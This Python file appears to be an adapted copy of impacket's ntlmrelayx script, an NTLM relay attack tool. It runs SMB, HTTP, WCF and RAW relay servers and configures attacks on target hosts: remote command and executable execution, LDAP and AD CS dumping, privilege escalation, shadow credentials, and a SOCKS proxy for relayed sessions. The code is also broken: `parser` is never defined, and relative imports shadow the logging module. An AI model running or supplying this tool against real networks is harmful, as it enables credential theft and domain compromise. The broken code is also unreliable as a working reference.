from pathlib import Path
import argparse
import sys
import logging
import cmd
from urllib.request import ProxyHandler, build_opener, Request
import json
from time import sleep
from threading import Thread
import typing as T

import click
from impacket import version
from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer, WCFRelayServer, RAWRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig, parse_listening_ports
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS

from ... import logging
from ...toolz import *

RELAY_SERVERS = []

class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads):
        cmd.Cmd.__init__(self)

        self.prompt = 'ntlmrelayx> '
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_finished_attacks(self, line):
        for url in self.relayConfig.target.finishedAttacks:
            print (url.geturl())
        return

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
        url = "http://localhost:9090/ntlmrelayx/api/v1.0/relays"
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_startservers(self, line):
        if not self.serversRunning:
            start_servers(options, self.relayThreads)
            self.serversRunning = True
            logging.info('Relay servers started')
        else:
            logging.error('Relay servers are already running!')

    def do_stopservers(self, line):
        if self.serversRunning:
            stop_servers(self.relayThreads)
            self.serversRunning = False
            logging.info('Relay servers stopped')
        else:
            logging.error('Relay servers are already stopped!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)

def start_servers(options, threads):
    for server in RELAY_SERVERS:
        #Set up config
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(options.socks, socksServer)
        c.setTargets(targetSystem)
        c.setExeFile(options.e)
        c.setCommand(options.c)
        c.setEnumLocalAdmins(options.enum_local_admins)
        c.setDisableMulti(options.no_multirelay)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
        c.setRPCOptions(options.rpc_mode, options.rpc_use_smb, options.auth_smb, options.hashes_smb, options.rpc_smb_port)
        c.setMSSQLOptions(options.query)
        c.setInteractive(options.interactive)
        c.setIMAPOptions(options.keyword, options.mailbox, options.all, options.imap_max)
        c.setIPv6(options.ipv6)
        c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
        c.setSMB2Support(options.smb2support)
        c.setSMBChallenge(options.ntlmchallenge)
        c.setInterfaceIp(options.interface_ip)
        c.setExploitOptions(options.remove_mic, options.remove_target)
        c.setWebDAVOptions(options.serve_image)
        c.setIsADCSAttack(options.adcs)
        c.setADCSOptions(options.template)
        c.setIsShadowCredentialsAttack(options.shadow_credentials)
        c.setShadowCredentialsOptions(options.shadow_target, options.pfx_password, options.export_type,
                                      options.cert_outfile_path)

        c.setAltName(options.altname)

        #If the redirect option is set, configure the HTTP server to redirect targets to SMB
        if server is HTTPRelayServer and options.r is not None:
            c.setMode('REDIRECT')
            c.setRedirectHost(options.r)

        #Use target randomization if configured and the server is not SMB
        if server is not SMBRelayServer and options.random:
            c.setRandomTargets(True)

        if server is HTTPRelayServer:
            c.setDomainAccount(options.machine_account, options.machine_hashes, options.domain)
            for port in options.http_port:
                c.setListeningPort(port)
                s = server(c)
                s.start()
                threads.add(s)
                sleep(0.1)
            continue

        elif server is SMBRelayServer:
            c.setListeningPort(options.smb_port)
        elif server is WCFRelayServer:
            c.setListeningPort(options.wcf_port)
        elif server is RAWRelayServer:
            c.setListeningPort(options.raw_port)

        s = server(c)
        s.start()
        threads.add(s)
    return c

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, tuple(RELAY_SERVERS)):
            thread.server.shutdown()
            todelete.append(thread)
    # Now remove threads from the set
    for thread in todelete:
        threads.remove(thread)
        del thread



# Process command-line arguments.
if __name__ == '__main__':
    try:
       options = parser.parse_args()
    except Exception as e:
       logging.error(str(e))
       sys.exit(1)

    if options.rpc_use_smb and not options.auth_smb:
       logging.error("Set -auth-smb to relay DCE/RPC to SMB pipes")
       sys.exit(1)

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)
        logging.getLogger('impacket.smbserver').setLevel(logging.ERROR)

    # Let's register the protocol clients we have
    # ToDo: Do this better somehow
    from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
    from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS


    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()

    if options.target is not None:
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(
            singleTarget=options.target, 
            protocolClients=PROTOCOL_CLIENTS, 
            randomize=options.random)
        # Disabling multirelay feature (Single host + general candidate)
        if targetSystem.generalCandidates:
            options.no_multirelay = True
    else:
        if options.tf is not None:
            #Targetfile specified
            logging.info("Running in relay mode to hosts in targetfile")
            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS, randomize=options.random)
            mode = 'RELAY'
        else:
            logging.info("Running in reflection mode")
            targetSystem = None
            mode = 'REFLECTION'

    if not options.no_smb_server:
        RELAY_SERVERS.append(SMBRelayServer)

    if not options.no_http_server:
        RELAY_SERVERS.append(HTTPRelayServer)
        try:
            options.http_port = parse_listening_ports(options.http_port)
        except ValueError:
            logging.error("Incorrect specification of port range for HTTP server")
            sys.exit(1)

        if options.r is not None:
            logging.info("Running HTTP server in redirect mode")

    if not options.no_wcf_server:
        RELAY_SERVERS.append(WCFRelayServer)

    if not options.no_raw_server:
        RELAY_SERVERS.append(RAWRelayServer)

    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    threads = set()
    socksServer = None
    if options.socks is True:
        # Start a SOCKS proxy in the background
        socksServer = SOCKS()
        socksServer.daemon_threads = True
        socks_thread = Thread(target=socksServer.serve_forever)
        socks_thread.daemon = True
        socks_thread.start()
        threads.add(socks_thread)

    c = start_servers(options, threads)

    print("")
    logging.info("Servers started, waiting for connections")
    try:
        if options.socks:
            shell = MiniShell(c, threads)
            shell.cmdloop()
        else:
            sys.stdin.read()
    except KeyboardInterrupt:
        pass
    else:
        pass

    if options.socks is True:
        socksServer.shutdown()
        del socksServer

    for s in threads:
        del s

    sys.exit(0)
